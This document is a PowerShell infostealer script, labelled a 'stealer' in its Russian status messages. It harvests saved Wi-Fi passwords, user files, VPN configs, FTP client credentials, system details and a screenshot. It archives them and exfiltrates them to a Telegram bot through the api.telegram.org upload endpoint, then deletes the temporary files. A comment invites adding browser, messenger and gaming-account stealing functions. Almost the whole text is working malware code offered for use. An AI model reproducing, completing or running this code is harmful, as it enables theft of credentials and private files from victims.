# --- Сообщения ---
$messages = @{
    Start = "Запуск стиллера...";
    SystemCollect = "Сбор информации о системе";
    BrowsersCollect = "Сбор данных браузеров...";
    FilesCollect = "Сбор файлов...";
    GamingCollect = "Сбор данных игровых клиентов...";
    MessengersCollect = "Сбор логов мессенджеров...";
    Screenshot = "Делаем снимок экрана...";
    UserActivity = "Сбор клипборда и специфической активности...";
    NetworkCollect = "VPN/FTP данные...";
    Archive = "Архивируем данные...";
    TelegramSend = "Отправка архива в Telegram...";
    Success = "Архив успешно отправлен.";
    FailSend = "Не получилось отправить архив.";
    Finished = "Стиллер завершён.";
}
$BotToken = "<ВАШ_ТОКЕН>"
$ChatID = "<ВАШ_CHAT_ID>"

Add-Type -Assembly System.IO.Compression.FileSystem

function WriteMsg($key) { Write-Host $messages[$key] }

function Split-File {
    param ([string]$FilePath, [int]$PartSizeMB = 49)
    $bufSize = 1MB
    $maxBytes = $PartSizeMB * 1MB
    $filename = [System.IO.Path]::GetFileNameWithoutExtension($FilePath)
    $ext = [System.IO.Path]::GetExtension($FilePath)
    $dir = [System.IO.Path]::GetDirectoryName($FilePath)
    $parts = @()
    $f = [System.IO.File]::OpenRead($FilePath)
    try {
        $partIdx = 1
        while ($f.Position -lt $f.Length) {
            $partName = "$dir\$filename.part$partIdx$ext"
            $out = [System.IO.File]::Create($partName)
            $written = 0
            $buf = New-Object byte[] $bufSize
            while ($written -lt $maxBytes -and $f.Position -lt $f.Length) {
                $toRead = [Math]::Min($bufSize, $maxBytes - $written)
                $r = $f.Read($buf, 0, $toRead)
                if ($r -gt 0) { $out.Write($buf, 0, $r); $written += $r } else { break }
            }
            $out.Close(); $parts += $partName; $partIdx++
        }
    } finally { $f.Close() }
    return $parts
}

function Send-ResultToTelegram {
    param (
        [string]$BotToken,
        [string]$ChatID,
        [string]$ZipPath,
        [string]$SystemInfoPath
    )
    $caption = Get-Content $SystemInfoPath | Out-String
    $url = "https://api.telegram.org/bot$BotToken/sendDocument"
    try {
        Add-Type -AssemblyName System.Net.Http
        $fileStream = [System.IO.File]::OpenRead($ZipPath)
        $fileName = [System.IO.Path]::GetFileName($ZipPath)
        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
        $form = New-Object System.Net.Http.MultipartFormDataContent
        $form.Add($fileContent, "document", $fileName)
        $form.Add((New-Object System.Net.Http.StringContent($ChatID)), "chat_id")
        $form.Add((New-Object System.Net.Http.StringContent($caption)), "caption")
        $client = New-Object System.Net.Http.HttpClient
        $response = $client.PostAsync($url, $form).Result
        $statusCode = $response.StatusCode
        $fileStream.Dispose(); $form.Dispose(); $client.Dispose()
        if ($statusCode -eq [System.Net.HttpStatusCode]::OK) { return $true } else { return $false }
    } catch { return $false }
}

function Get-SystemInfo {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
    $ipConfig = Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress
    $externalIp = try { (Invoke-RestMethod -Uri 'https://api.ipify.org').Trim() } catch { "N/A" }
    $userInfo = "Username: $($env:USERNAME)`r`nComputerName: $($env:COMPUTERNAME)`r`nLocal IP: $($ipConfig.IPAddress -join ', ')`r`nExternal IP: $externalIp"
    $userInfo | Out-File "$OutDirectory\user_info.txt"
    $sysInfo = @{
        OS = (Get-CimInstance Win32_OperatingSystem).Caption
        Version = (Get-CimInstance Win32_OperatingSystem).Version
        Architecture = $env:PROCESSOR_ARCHITECTURE
        RAM_GB = [Math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
        CPU = (Get-CimInstance Win32_Processor).Name
    }
    $sysInfo | Out-File "$OutDirectory\computer_info.txt"
    Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize | Out-File "$OutDirectory\installed_programs.txt"
    try {
        $wifiProfiles = (netsh wlan show profiles) | Select-String ":(.+)$" | %{$_.Matches.Groups[1].Value.Trim()}
        $wifiData = foreach ($profile in $wifiProfiles) {
            try {
                $profileData = (netsh wlan show profile name="$profile" key=clear)
                $password = $profileData | Select-String "Key Content\W+\:(.+)$" | %{$_.Matches.Groups[1].Value.Trim()}
                if ($password) { [PSCustomObject]@{SSID=$profile; Password=$password} }
            } catch {}
        }
        $wifiData | Format-Table -AutoSize | Out-File "$OutDirectory\wifi_passwords.txt"
    } catch {}
}

function Gather-Files { 
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
    $userDirs = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")
    foreach ($dir in $userDirs) {
        if (Test-Path $dir) {
            Get-ChildItem -Path $dir -File -Recurse -ErrorAction SilentlyContinue |
                Where-Object { 
                    $_.Length -lt 20MB -and 
                    $_.Attributes -notmatch "System" -and 
                    $_.Name -notmatch "(?:pagefile|swapfile|\.tmp$|\.log$)" -and
                    $_.FullName -notmatch "\\Cache\\|\\Code Cache\\|\\GPUCache\\|\\Service Worker\\|\\Local Storage\\|\\Session Storage\\"
                } | foreach {
                try {
                    Copy-Item $_.FullName -Destination "$OutDirectory\" -Force -ErrorAction Stop
                } catch {
                    Add-Content "$OutDirectory\copy_errors.txt" "FAILED: $($_.FullName) : $($_.Exception.Message)"
                }
            }
        }
    }
}

function Get-VpnFtpData {
    param($OutDirectory)
    New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
    $vpnDir = "$OutDirectory\VPN_Configs"
    New-Item -Path $vpnDir -ItemType Directory -Force | Out-Null
    $searchDirs = @(
        "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop",
        "$env:APPDATA\OpenVPN", "$env:APPDATA\OpenVPN Connect", "$env:APPDATA\ProtonVPN"
    )
    foreach ($dir in $searchDirs) {
        if (Test-Path $dir) {
            Get-ChildItem -Path $dir -File -Recurse -Include *.ovpn, *.conf, *.ini -ErrorAction SilentlyContinue |
                Where-Object { $_.Length -le 5MB } |
                ForEach-Object {
                    try { Copy-Item $_.FullName -Destination $vpnDir -Force -ErrorAction Stop }
                    catch { Add-Content "$vpnDir\copy_errors.txt" "FAILED: $($_.FullName) : $($_.Exception.Message)" }
                }
        }
    }
    $rootfiles = @(
        "$env:USERPROFILE\*.ovpn", "$env:USERPROFILE\*.conf", "$env:USERPROFILE\*.ini"
    )
    foreach ($pattern in $rootfiles) {
        Get-ChildItem -Path $pattern -File -ErrorAction SilentlyContinue |
            Where-Object { $_.Length -le 5MB } |
            ForEach-Object {
                try { Copy-Item $_.FullName -Destination $vpnDir -Force -ErrorAction Stop }
                catch { Add-Content "$vpnDir\copy_errors.txt" "FAILED: $($_.FullName) : $($_.Exception.Message)" }
            }
    }
    $ftpDir = "$OutDirectory\FTP_Clients"
    New-Item -Path $ftpDir -ItemType Directory -Force | Out-Null
    $ftpPaths = @(
        "$env:APPDATA\FileZilla",
        "$env:APPDATA\WinSCP.ini",
        "$env:APPDATA\CoreFTP",
        "$env:APPDATA\Cyberduck",
        "$env:APPDATA\SmartFTP"
    )
    foreach ($ftpPath in $ftpPaths) {
        if (Test-Path $ftpPath) {
            try { Copy-Item $ftpPath -Destination $ftpDir -Recurse -Force -ErrorAction Stop }
            catch { Add-Content "$ftpDir\copy_errors.txt" $_.Exception.Message }
        }
    }
}

function Take-Screenshot {
    param($OutFile)
    Add-Type -AssemblyName System.Windows.Forms
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size)
    $bitmap.Save($OutFile)
    $graphics.Dispose()
    $bitmap.Dispose()
}

# Здесь добавьте функции Get-BrowserData, Get-GameLauncherData, Get-MessengerData, Get-UserActivity из вашей версии!

function Start-Execution {
    WriteMsg "Start"
    $tempDir = "$env:TEMP\SystemData-$(Get-Random)"
    New-Item -Path $tempDir -ItemType Directory -Force | Out-Null

    $jobs = @()
    WriteMsg "SystemCollect"
    $jobs += Start-Job -ScriptBlock { param($dir); Get-SystemInfo -OutDirectory "$dir\System" } -ArgumentList $tempDir
    WriteMsg "BrowsersCollect"
    $jobs += Start-Job -ScriptBlock { param($dir); Get-BrowserData -OutDirectory "$dir\Browsers" } -ArgumentList $tempDir
    WriteMsg "FilesCollect"
    $jobs += Start-Job -ScriptBlock { param($dir); Gather-Files -OutDirectory "$dir\Files" } -ArgumentList $tempDir
    WriteMsg "GamingCollect"
    $jobs += Start-Job -ScriptBlock { param($dir); Get-GameLauncherData -OutDirectory "$dir\Gaming" } -ArgumentList $tempDir
    WriteMsg "MessengersCollect"
    $jobs += Start-Job -ScriptBlock { param($dir); Get-MessengerData -OutDirectory "$dir\Messengers" } -ArgumentList $tempDir
    WriteMsg "UserActivity"
    $jobs += Start-Job -ScriptBlock { param($dir); Get-UserActivity -OutDirectory "$dir\Activity" } -ArgumentList $tempDir
    WriteMsg "NetworkCollect"
    $jobs += Start-Job -ScriptBlock { param($dir); Get-VpnFtpData -OutDirectory "$dir\Network" } -ArgumentList $tempDir

    $jobs | Wait-Job | Receive-Job | Out-Null
    $jobs | Remove-Job

    WriteMsg "Screenshot"
    Take-Screenshot -OutFile "$tempDir\screenshot.png"

    WriteMsg "Archive"
    $zipPath = "$env:TEMP\DataPackage-$(Get-Random).zip"
    if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
    [System.IO.Compression.ZipFile]::CreateFromDirectory(
        $tempDir,
        $zipPath,
        [System.IO.Compression.CompressionLevel]::Fastest,
        $false
    )

    $maxTelegramMB = 49
    $zipSizeMB = [Math]::Round((Get-Item $zipPath).Length / 1MB,2)
    WriteMsg "TelegramSend"
    if ($zipSizeMB -le $maxTelegramMB) {
        $ok = Send-ResultToTelegram $BotToken $ChatID $zipPath "$tempDir\System\user_info.txt"
        if ($ok) { WriteMsg "Success" } else { WriteMsg "FailSend" }
    } else {
        $parts = Split-File -FilePath $zipPath -PartSizeMB $maxTelegramMB
        $allOk = $true
        foreach ($pt in $parts) {
            $ok = Send-ResultToTelegram $BotToken $ChatID $pt "$tempDir\System\user_info.txt"
            if (-not $ok) { $allOk = $false }
        }
        if ($allOk) { WriteMsg "Success" } else { WriteMsg "FailSend" }
    }
    Remove-Item -Path $tempDir -Recurse -Force -Confirm:$false
    Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
    WriteMsg "Finished"
}

Start-Execution
